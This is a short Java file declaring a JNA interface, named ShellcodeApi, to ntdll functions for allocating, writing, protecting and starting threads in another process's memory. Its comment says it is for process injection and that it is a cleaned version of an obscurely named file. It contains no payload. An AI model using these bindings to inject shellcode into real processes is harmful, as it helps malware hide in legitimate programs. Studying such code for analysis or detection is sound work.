import com.sun.jna.Native;
import com.sun.jna.Pointer;
import com.sun.jna.platform.win32.WinNT;
import com.sun.jna.ptr.IntByReference;
import com.sun.jna.ptr.PointerByReference;
import com.sun.jna.win32.StdCallLibrary;

/**
 * Cleaned ShellcodeApi (formerly p.java)
 * JNA interface for ntdll.dll functions used for process injection.
 */
public interface ShellcodeApi extends StdCallLibrary {
    ShellcodeApi INSTANCE = Native.load("ntdll", ShellcodeApi.class);

    int NtAllocateVirtualMemory(WinNT.HANDLE hProc, PointerByReference base, Pointer zero, PointerByReference size, int type, int protect);
    int NtWriteVirtualMemory(WinNT.HANDLE hProc, Pointer base, byte[] buffer, int size, IntByReference written);
    int NtProtectVirtualMemory(WinNT.HANDLE hProc, PointerByReference base, PointerByReference size, int newProtect, IntByReference oldProtect);
    int NtCreateThreadEx(PointerByReference hThread, int access, Pointer attr, WinNT.HANDLE hProc, Pointer start, Pointer param, int flags, long zero1, long zero2, long zero3, Pointer zero4);
}
